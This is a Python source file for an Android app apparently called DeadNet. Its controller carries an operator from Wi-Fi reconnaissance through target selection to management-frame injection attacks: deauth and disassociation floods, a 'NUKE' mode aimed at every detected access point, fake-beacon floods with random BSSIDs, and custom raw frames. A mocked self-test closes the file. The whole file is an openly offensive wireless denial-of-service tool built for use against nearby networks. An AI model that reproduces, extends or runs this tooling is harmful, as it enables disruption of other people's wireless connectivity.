"""
AppController (v3 M4) — the ANDROID<->APP{RECON,ATTACK} state machine.

This is the brain of the own-the-PHY redesign. It bridges the Kivy screens to the
v3 engine layer and encodes the operator workflow from V3_PLAN §3:

    launch ─► OWN PHY ──► APP/RECON   (monitor; Android guarded)
                            │  live target list (recon.TargetStore)
                            ▼
                          SELECT      (operator picks targets / S<pattern>)
                            ▼
                          APP/ATTACK  (managed vif up, unassociated; mgmt-TX)
                            │  live: accepted/N, actual pps
                            ▼
                          RELEASE ─► ANDROID (baseline restored, guard off)

Ownership + mode are owned by `engine.phyguard.PhyGuard`; target discovery by
`engine.recon.ReconScanner` (monitor); the attack by
`engine.attack.AttackController` driving `engine.mgmt_tx` through the patched
cfg80211 (gated by `engine.capgate.CapGate`). Only one PhyMode is ever live —
the single RF chain forbids monitor + managed together — so RECON capture is
torn down before an ATTACK burst and restored after.

Headless-safe: the Kivy Logger import is guarded and every privileged call is
funnelled through the engine modules, so this file imports and its state-machine
self-test runs off-device (all engine collaborators are injectable). Stdlib +
engine only.
"""
from __future__ import annotations

import enum
import threading
from typing import Callable, Dict, List, Optional

try:
    from kivy.logger import Logger
except Exception:  # off-device
    class _L:
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

from engine.contracts import Ownership, PhyMode, now_ms
from engine.recon import TargetStore, ScanScanner, DEFAULT_CHANNELS
from engine.attack import (
    AttackController, AttackPlan, ATTACK_MODES, from_recon, select_spoof,
    build_spoof_set, mode_label, mode_desc, mode_knobs,
)
from engine.mgmt_tx import (
    MgmtTxController, MgmtCtx, MgmtTarget, DEFAULT_FREQ, check_hexframe, norm_mac,
)


def _rand_la_mac() -> str:
    """A random locally-administered, unicast MAC as 12 lowercase hex chars."""
    import random
    first = (random.randint(0, 255) & 0xfe) | 0x02   # clear mcast bit, set LA bit
    return "%02x%s" % (first, "".join("%02x" % random.randint(0, 255) for _ in range(5)))

DEADNET_PREF = "DeadNet"

# Attack-mode ids that need no recon selection (wildcard / self-targeting).
NUKE_MODE = 0


class AppState(enum.Enum):
    """Flattened view of PhyGuard ownership+mode for the UI."""
    ANDROID = "android"   # Ownership.ANDROID — radio with the framework
    RECON = "recon"       # Ownership.APP + PhyMode.RECON — monitor detect
    ATTACK = "attack"     # Ownership.APP + PhyMode.ATTACK — mgmt-TX injection


class AppController:
    def __init__(self, appdir: str, managed_iface: str = "wlan0",
                 mon_iface: str = "mon0",
                 on_event: Optional[Callable[[str, dict], None]] = None,
                 phyguard=None, tx=None, capgate=None, attack=None,
                 recon_factory=None):
        self.appdir = appdir
        self.managed_iface = managed_iface
        self.mon_iface = mon_iface
        self._emit = on_event or (lambda kind, data: None)

        # --- engine collaborators (all injectable for the off-device test) ---
        if phyguard is None:
            from engine.phyguard import PhyGuard
            phyguard = PhyGuard(managed_iface, mon_iface)
        self.phyguard = phyguard
        self.store = TargetStore()
        self.tx = tx if tx is not None else MgmtTxController(appdir)
        if capgate is None:
            from engine.capgate import CapGate
            capgate = CapGate(iface=managed_iface, tx_send=self.tx.send)
        self.capgate = capgate
        self.attack = attack if attack is not None else AttackController(
            self.tx.send, ensure_attack=self._ensure_attack_mode)
        # recon_factory(store, on_target) -> a scanner with start()/stop().
        # RECON is the framework's own Wi-Fi scan (con_mode=0, no monitor vif,
        # no PHY seize) — this device can't do a concurrent monitor and its
        # global con_mode=4 monitor is crash-prone and conflicts with the
        # associated mgmt-TX ATTACK path. See engine/recon.ScanScanner.
        self._recon_factory = recon_factory or self._default_recon_factory
        self.recon = None
        self._recon_on: bool = False

        # --- operator state ---
        self.recon_channel: int = 6
        self.attack_channel: int = 0   # 0 = none selected (selection requires a channel)
        self.selection_spec: str = ""
        self.spoof: List[MgmtTarget] = []          # resolved spoof set (the picks)
        self.attack_mode: int = 1                  # catalogue id (0 = NUKE)
        self.pps: int = 100
        self.budget: int = 0                       # 0 = until stopped (knob, no cap)
        self.patched: Optional[bool] = None        # last CapGate decision
        self.cap_reason: str = ""
        # per-action knobs (fed into MgmtCtx; only the ones a mode uses matter)
        self.knob_cli: str = ""                    # target client MAC (directed)
        self.knob_fake: str = ""                   # spoofed source (floods)
        self.knob_ssid: str = ""                   # SSID override
        self.knob_hex: str = ""                    # custom frame (mode 12)
        self.knob_payload: str = ""                # action-frame body (8-10)
        self.knob_reason: int = 0                  # deauth/disassoc reason (0=default)
        self.sap_enabled: bool = False             # use SAP + sysfs inject for unassociated TX

        self._attack_stop: Optional[threading.Event] = None
        self._attack_thread: Optional[threading.Thread] = None
        self._attack_t0: int = 0                   # ns start, for actual-pps
        self._tick: Dict[str, int] = {"sent": 0, "ok": 0, "pps": 0}
        self._lock = threading.RLock()

    # -- recon scanner builder --------------------------------------------
    def _default_recon_factory(self, store, on_target):
        return ScanScanner(store=store, on_target=on_target)

    # -- event helper ------------------------------------------------------
    def emit(self, kind: str, **data) -> None:
        try:
            self._emit(kind, data)
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: on_event({kind}) raised {exc}")

    # -- state view --------------------------------------------------------
    @property
    def state(self) -> AppState:
        # No PHY seize in this device's model: RECON = the scan loop is running,
        # ATTACK = a mgmt-TX burst is in flight, else ANDROID (idle).
        if self.is_attacking():
            return AppState.ATTACK
        if self._recon_on:
            return AppState.RECON
        return AppState.ANDROID

    def is_attacking(self) -> bool:
        t = self._attack_thread
        return t is not None and t.is_alive()

    def capabilities(self) -> dict:
        st = self.state
        return {
            "state": st.value,
            "ownership": "app" if st is not AppState.ANDROID else "android",
            "mode": st.value if st is not AppState.ANDROID else "",
            "patched": self.patched,
            "cap_reason": self.cap_reason,
            "targets": self.store.count(),
            "aps": self.store.count("ap"),
            "stations": self.store.count("station"),
            "selected": len(self.spoof),
            "attacking": self.is_attacking(),
        }

    def _emit_state(self) -> None:
        self.emit("state", **self.capabilities())

    # =====================================================================
    # OWN / RECON  (ANDROID -> APP/RECON: seize monitor + start discovery)
    # =====================================================================
    def own_recon(self, channel: Optional[int] = None) -> bool:
        """Enter RECON: start the Android-scan loop. No PHY seize — the radio
        stays with the framework (con_mode=0, associated), which is what keeps
        the mgmt-TX ATTACK path usable. `channel` is accepted for API symmetry
        but ignored (the scan sweeps every channel)."""
        with self._lock:
            self._recon_on = True
            self._start_recon()
            self.emit("recon", channel=0)
            self._emit_state()
            return True

    def _start_recon(self) -> None:
        if self.recon is not None:
            return
        self.recon = self._recon_factory(self.store, self._on_target)
        try:
            self.recon.start()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: recon start failed: {exc}")

    def _stop_recon(self) -> None:
        r, self.recon = self.recon, None
        if r is not None:
            try:
                r.stop()
            except Exception as exc:  # noqa: BLE001
                Logger.error(f"{DEADNET_PREF}: recon stop failed: {exc}")

    def _on_target(self, t) -> None:
        # throttled at the UI layer; just surface that the inventory grew/changed
        self.emit("target", mac=t.mac, kind=t.kind, ssid=t.ssid,
                  channel=t.channel, rssi=t.rssi)

    def targets(self, kind: Optional[str] = None, channel: Optional[int] = None) -> List[dict]:
        """Current recon inventory as dicts (APs + stations), RSSI-sorted.
        Filtered to `channel` (or self.attack_channel) when set."""
        ch = self.attack_channel if channel is None else channel
        snap = self.store.snapshot(kind)
        if ch:
            snap = [t for t in snap if getattr(t, "channel", 0) == ch]
        return [t.as_dict() for t in snap]

    def clear_targets(self) -> None:
        self.store.clear()
        self.emit("targets_cleared")

    def available_channels(self) -> List[int]:
        """Distinct channels present in the current recon inventory."""
        chs = {getattr(t, "channel", 0) for t in self.store.snapshot()}
        return sorted(c for c in chs if c)

    def set_attack_channel(self, channel: int) -> None:
        try:
            self.attack_channel = int(channel)
        except (TypeError, ValueError):
            self.attack_channel = 0
        self.emit("attack_channel", channel=self.attack_channel)

    def _targets_for_channel(self, kind=None, channel=None):
        ch = self.attack_channel if channel is None else channel
        out = self.store.snapshot(kind)
        if ch:
            out = [t for t in out if getattr(t, "channel", 0) == ch]
        return out

    # =====================================================================
    # SELECT  (resolve a selection spec against the recon inventory)
    # =====================================================================
    def set_selection(self, spec: str, channel: Optional[int] = None) -> int:
        """Resolve a selection spec against targets on the chosen channel.
        `channel` (or self.attack_channel) is REQUIRED: selection is scoped to one
        channel because the SAP channel-context serves one channel at a time.
        Returns the count (0 if no channel is set)."""
        if channel is not None:
            self.set_attack_channel(channel)
        self.selection_spec = (spec or "").strip()
        if not self.attack_channel:
            self.emit("error", msg="select a channel first")
            self.spoof = []
            return 0
        cand = self._targets_for_channel(channel=self.attack_channel)
        mts = [from_recon(t) for t in cand]
        self.spoof = select_spoof(mts, self.selection_spec, default_freq=DEFAULT_FREQ)
        self.emit("selection", spec=self.selection_spec, n=len(self.spoof),
                  channel=self.attack_channel,
                  targets=[self._mt_dict(m) for m in self.spoof])
        return len(self.spoof)

    def clear_selection(self) -> None:
        self.selection_spec = ""
        self.spoof = []
        self.emit("selection", spec="", n=0, targets=[])

    @staticmethod
    def _mt_dict(m: MgmtTarget) -> dict:
        return {"mac": m.mac, "typ": m.typ, "freq": m.freq,
                "label": m.label, "ssid": m.ssid}

    def selected(self) -> List[dict]:
        return [self._mt_dict(m) for m in self.spoof]

    def set_mode(self, mode: int) -> None:
        self.attack_mode = int(mode)
        self.emit("attack_mode", mode=self.attack_mode,
                  label=mode_label(self.attack_mode), desc=mode_desc(self.attack_mode),
                  knobs=list(mode_knobs(self.attack_mode)))

    def set_pps(self, pps: int) -> None:
        self.pps = max(1, int(pps))

    def set_budget(self, budget: int) -> None:
        """Frames to send before auto-stopping; 0 = until STOP (operator knob)."""
        try:
            self.budget = max(0, int(budget))
        except (TypeError, ValueError):
            self.budget = 0

    # -- per-action knobs (only the ones the active mode uses are applied) ---
    def set_client(self, mac: str) -> None:
        self.knob_cli = (mac or "").strip()

    def set_fake(self, mac: str) -> None:
        self.knob_fake = (mac or "").strip()

    def set_ssid(self, ssid: str) -> None:
        self.knob_ssid = ssid or ""

    def set_custom_hex(self, hexframe: str) -> None:
        self.knob_hex = (hexframe or "").strip()

    def set_payload(self, payload: str) -> None:
        self.knob_payload = (payload or "").strip()

    def set_reason(self, reason) -> None:
        try:
            self.knob_reason = max(0, min(255, int(reason)))
        except (TypeError, ValueError):
            self.knob_reason = 0

    def set_sap_enabled(self, on: bool) -> None:
        self.sap_enabled = bool(on)
        self.emit("sap", enabled=self.sap_enabled)

    def start_sap(self, channel: Optional[int] = None) -> bool:
        """Bring up a SoftAP channel-context (unassociated injection)."""
        ch = channel if channel is not None else self.recon_channel
        from engine.recon import channel_to_freq
        # channel may be MHz or channel number; normalize to MHz best-effort
        try:
            ch = int(ch)
        except (TypeError, ValueError):
            ch = self.recon_channel
        if ch and ch < 1000:
            try:
                ch = channel_to_freq(ch) or ch
            except Exception:  # noqa: BLE001
                pass
        if not hasattr(self.tx, "enable_sap"):
            return False
        try:
            return bool(self.tx.enable_sap(ch, iface=self.managed_iface))
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: sap start failed: {exc}")
            return False

    def stop_sap(self) -> None:
        if hasattr(self.tx, "disable_sap"):
            try:
                self.tx.disable_sap()
            except Exception:  # noqa: BLE001
                pass

    def _mgmt_ctx(self) -> MgmtCtx:
        """Build the MgmtCtx for a run from the current knobs."""
        return MgmtCtx(assoc_ssid=self.knob_ssid, fake=self.knob_fake,
                       cli=self.knob_cli, custom_hex=self.knob_hex,
                       reason=self.knob_reason, payload=self.knob_payload)

    # =====================================================================
    # CAPABILITY GATE  (patched cfg80211 required for ATTACK)
    # =====================================================================
    def check_capability(self) -> bool:
        """Run CapGate (stages the injector, sends an inert spoofed-SA probe).
        Caches the decision; ATTACK refuses unless patched. Needs the PHY in a
        TX-capable state (owned, or associated) for the probe to be meaningful."""
        try:
            self.tx.stage()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: injector stage failed: {exc}")
        try:
            res = self.capgate.check()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: capgate failed: {exc}")
            self.patched, self.cap_reason = False, f"capgate error: {exc}"
            self.emit("capgate", patched=False, reason=self.cap_reason)
            return False
        self.patched = bool(res.patched)
        self.cap_reason = res.reason
        self.emit("capgate", patched=self.patched, reason=self.cap_reason,
                  decided_by=res.decided_by)
        return self.patched

    # =====================================================================
    # ATTACK  (APP/RECON -> APP/ATTACK: scheduled mgmt-TX at the selection)
    # =====================================================================
    def _ensure_attack_mode(self) -> bool:
        """Prepare for a mgmt-TX burst. On this device ATTACK injects on the
        associated wlan0 (no seize), so there is nothing to seize — we only stop
        the scan loop so its start-scans don't contend with TX timing."""
        self._stop_recon()
        return True

    def _spoof_for_run(self) -> List[MgmtTarget]:
        if self.attack_mode == NUKE_MODE:
            # NUKE: wildcard over every detected AP (fall back to the picks).
            mts = [from_recon(t) for t in self._targets_for_channel(kind="ap")]
            nuke = build_spoof_set(mts, "all", own_freq=self.recon_freq())
            return nuke or self.spoof
        if self.attack_mode == 11 and not self.spoof:
            # beacon / probe-resp spoof with no target: fabricate the AP itself.
            return self._fabricate_beacon_aps()
        return list(self.spoof)

    def _fabricate_beacon_aps(self) -> List[MgmtTarget]:
        """A given BSSID (fake knob) -> one fake AP; blank -> a small flood of
        random BSSIDs. All advertise the operator's SSID (via MgmtCtx), on the
        STA's current operating channel so the beacon actually radiates there and
        its DS Param Set IE matches (otherwise scanners filter it out)."""
        if self.attack_channel:
            from engine.recon import channel_to_freq
            freq = channel_to_freq(self.attack_channel) or self._assoc_freq()
        else:
            freq = self._assoc_freq()
        base = norm_mac(self.knob_fake)
        if base:
            return [MgmtTarget(base, "ap", freq, "fake AP", self.knob_ssid)]
        return [MgmtTarget(_rand_la_mac(), "ap", freq, "fake AP", self.knob_ssid)
                for _ in range(8)]

    def _assoc_freq(self) -> int:
        """Current operating freq (MHz) of the managed vif, else the recon/default
        freq. An associated STA transmits on this channel regardless of the freq
        we request, so beacons must advertise and target it."""
        try:
            import re
            from engine import rootshell
            out = rootshell.su_cp(f"iw dev {self.managed_iface} link", 6).stdout or ""
            m = re.search(r"freq:\s*(\d+)", out)
            if m:
                return int(m.group(1))
        except Exception:  # noqa: BLE001
            pass
        return self.recon_freq()

    def recon_freq(self) -> int:
        from engine.recon import channel_to_freq
        f = channel_to_freq(self.recon_channel)
        return f or DEFAULT_FREQ

    def start_attack(self, budget: Optional[int] = None) -> bool:
        """Begin the mgmt-TX burst over the current selection. Gated by CapGate:
        refuses on a stock (unpatched) cfg80211. Runs on a worker thread; live
        progress arrives via the 'attack_tick' event."""
        with self._lock:
            if self.is_attacking():
                self.emit("error", msg="already attacking")
                return False
            if self.patched is None:
                self.check_capability()
            if not self.patched:
                self.emit("error", msg=f"ATTACK blocked — {self.cap_reason or 'stock cfg80211'}")
                return False
            if self.attack_mode == 12:            # custom hex: validate before firing
                ok, why = check_hexframe(self.knob_hex)
                if not ok:
                    self.emit("error", msg=f"custom frame rejected — {why}")
                    return False
            spoof = self._spoof_for_run()
            if not spoof:
                self.emit("error", msg="no targets selected (pick from RECON, or use NUKE)")
                return False
            if self.sap_enabled:
                ch = spoof[0].freq if spoof else self.recon_freq()
                if hasattr(self.tx, "enable_sap"):
                    try:
                        if not self.tx.enable_sap(ch, iface=self.managed_iface):
                            self.emit("error", msg="SAP start failed (hostapd)")
                            return False
                    except Exception as exc:  # noqa: BLE001
                        self.emit("error", msg=f"SAP start failed: {exc}")
                        return False
            plan = AttackPlan(
                mode=self.attack_mode, spoof=spoof, iface=self.managed_iface,
                pps=self.pps, budget=(self.budget if budget is None else int(budget)),
                title=mode_label(self.attack_mode),
                nuke=(self.attack_mode == NUKE_MODE))
            ctx = self._mgmt_ctx()
            self._attack_stop = threading.Event()
            self._attack_t0 = now_ms()
            self._tick = {"sent": 0, "ok": 0, "pps": plan.pps}
            self._attack_thread = threading.Thread(
                target=self._attack_worker, args=(plan, ctx), name="attack", daemon=True)
            self._attack_thread.start()
            self._emit_state()
            self.emit("attack_start", mode=self.attack_mode, n=len(spoof), pps=self.pps)
            return True

    def _attack_worker(self, plan: AttackPlan, ctx: MgmtCtx) -> None:
        def on_tick(d: dict):
            self._tick = d
            self.emit("attack_tick", **d)
        try:
            summary = self.attack.run(plan, ctx, on_tick=on_tick, stop=self._attack_stop)
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: attack run failed: {exc}")
            summary = {"sent": self._tick.get("sent", 0), "ok": self._tick.get("ok", 0)}
        # fold the authoritative final counts in (on_tick only fires every ~pps
        # frames, so a short bounded burst may never have ticked)
        self._tick = {"sent": int(summary.get("sent", 0)),
                      "ok": int(summary.get("ok", 0)),
                      "pps": int(summary.get("target_pps", plan.pps))}
        self.emit("attack_done", **summary)
        self._emit_state()

    def stop_attack(self, back_to_recon: bool = True) -> None:
        """Halt the burst. By default resumes the RECON scan loop (if we were
        reconning) so the operator can reselect. Nothing to un-seize.

        STOP is made instant: set the stop flag AND interrupt any in-flight send
        so the worker can't be stuck waiting on a daemon reply."""
        with self._lock:
            if self._attack_stop is not None:
                self._attack_stop.set()
            t = self._attack_thread
        try:
            self.tx.interrupt()
        except Exception:  # noqa: BLE001
            pass
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        with self._lock:
            self._attack_thread = None
            self._attack_stop = None
            if back_to_recon and self._recon_on:
                self._start_recon()
            if not self.is_attacking():
                self.stop_sap()
            self._emit_state()

    def state_metrics(self) -> dict:
        """Live attack gauges (polled on a Clock tick). Two gauges:
        ACCEPTED = accepted/sent, RATE = actual_pps/target_pps."""
        t = self._tick or {}
        sent = int(t.get("sent", 0))
        ok = int(t.get("ok", 0))
        target_pps = int(t.get("pps", self.pps)) or 1
        elapsed = (now_ms() - self._attack_t0) / 1000.0 if self._attack_t0 else 0.0
        actual_pps = int(sent / elapsed) if elapsed > 0.2 else 0
        return {"sent": sent, "accepted": ok,
                "miss": max(0, sent - ok),
                "accept_pct": int(100 * ok / sent) if sent else 0,
                "pps": target_pps,
                "actual_pps": actual_pps,
                "rate_pct": min(100, int(100 * actual_pps / target_pps)) if target_pps else 0,
                "targets": len(self.spoof),
                "attacking": self.is_attacking()}

    # =====================================================================
    # RELEASE / SHUTDOWN
    # =====================================================================
    def release(self) -> bool:
        """Return to ANDROID/idle: stop any attack burst and the RECON scan loop,
        close the injector. Safe to re-call. Nothing was seized, so there is no
        baseline to restore — the framework kept the radio throughout."""
        with self._lock:
            if self._attack_stop is not None:
                self._attack_stop.set()
            t = self._attack_thread
        try:
            self.tx.interrupt()
        except Exception:  # noqa: BLE001
            pass
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        with self._lock:
            self._attack_thread = None
            self._attack_stop = None
            self._recon_on = False
            self._stop_recon()
            self.stop_sap()
            try:
                self.tx.close()
            except Exception:  # noqa: BLE001
                pass
            self.emit("released")
            self._emit_state()
            return True

    def shutdown(self) -> None:
        self.release()


if __name__ == "__main__":
    # Off-device state-machine self-test. Every engine collaborator is faked, so
    # we exercise ANDROID -> RECON -> (select) -> (capgate) -> ATTACK -> RECON ->
    # RELEASE and assert the transitions + gating without a device or root.
    import tempfile
    import types

    events: List[tuple] = []

    # RECON scanner fake (Android-scan model: start() seeds APs, no seize).
    class FakeScanScanner:
        def __init__(self, store):
            self.store = store; self.started = False; self.stopped = False
        def start(self):
            self.started = True
            from engine.recon import Target, now_ms
            self.store.upsert(Target(mac="aa:bb:cc:00:11:22", kind="ap", ssid="HomeNet",
                                     channel=6, freq=2437, rssi=-40, last_seen_ms=now_ms()))
            self.store.upsert(Target(mac="11:22:33:44:55:66", kind="ap", ssid="Cafe",
                                     channel=36, freq=5180, rssi=-60, last_seen_ms=now_ms()))
        def stop(self):
            self.stopped = True

    scanners: List[FakeScanScanner] = []
    def fake_recon_factory(store, on_target):
        s = FakeScanScanner(store); scanners.append(s); return s

    class FakeTx:
        def __init__(self): self.staged = False; self.closed = False; self.interrupts = 0
        def stage(self): self.staged = True; return "/x/nl80211_inject.arm64"
        def send(self, iface, freq, hexframe, fast=False): return (True, False)
        def interrupt(self): self.interrupts += 1
        def close(self): self.closed = True

    class FakeCap:
        def __init__(self, patched=True): self._p = patched
        def check(self, allow_probe=True):
            return types.SimpleNamespace(patched=self._p, decided_by="probe",
                                         reason=("patched" if self._p else "stock"))

    tx = FakeTx()
    ctl = AppController(tempfile.mkdtemp(), tx=tx, capgate=FakeCap(True),
                        recon_factory=fake_recon_factory,
                        on_event=lambda k, d: events.append((k, d)))

    # 1) ANDROID baseline (idle, radio with the framework)
    assert ctl.state is AppState.ANDROID
    # 2) RECON: scan loop starts (no seize), APs appear in the store
    assert ctl.own_recon() is True
    assert ctl.state is AppState.RECON and scanners[0].started
    assert ctl.store.count("ap") == 2, ctl.store.count("ap")

    # 3) SELECT: channel required, then targets on that channel only
    assert ctl.set_selection("all") == 0, "no channel -> no selection"
    ctl.set_attack_channel(6)
    assert ctl.set_selection("all") == 1
    assert ctl.set_selection("SHome*") == 1 and ctl.spoof[0].ssid == "HomeNet"
    ctl.set_attack_channel(36)
    assert ctl.set_selection("all") == 1
    ctl.set_attack_channel(6)
    assert ctl.set_selection("1") == 1

    # 4) ATTACK gated by CapGate; patched -> runs, stops the scan loop (no seize)
    ctl.set_mode(1); ctl.set_pps(200); ctl.budget = 10
    ctl.set_attack_channel(6); ctl.set_selection("all")
    assert ctl.start_attack() is True
    ctl._attack_thread.join(timeout=3.0)
    assert scanners[0].stopped, "scan loop must stop before an attack burst"
    m = ctl.state_metrics()
    assert m["sent"] == 10 and m["accepted"] == 10, m

    # 5) stop_attack -> RECON scan loop resumes (fresh scanner started)
    ctl.stop_attack(back_to_recon=True)
    resumed = scanners[-1]
    assert ctl.state is AppState.RECON and resumed.started

    # 6) CapGate refusal on stock cfg80211 blocks ATTACK (no prior seize needed)
    ctl2 = AppController(tempfile.mkdtemp(), tx=FakeTx(), capgate=FakeCap(False),
                         recon_factory=fake_recon_factory, on_event=lambda k, d: None)
    ctl2.own_recon(); ctl2.set_attack_channel(6); ctl2.set_selection("all")
    assert ctl2.start_attack() is False and ctl2.patched is False

    # 7) RELEASE -> ANDROID/idle, scan stopped, tx closed
    assert ctl.release() is True
    assert ctl.state is AppState.ANDROID and tx.closed and resumed.stopped
    assert tx.interrupts >= 1, "STOP/RELEASE must interrupt in-flight sends"

    kinds = [k for k, _ in events]
    for need in ("state", "recon", "selection", "attack_start", "attack_done", "released"):
        assert need in kinds, (need, kinds)
    print("AppController (v3 scan-recon state machine) PASS")
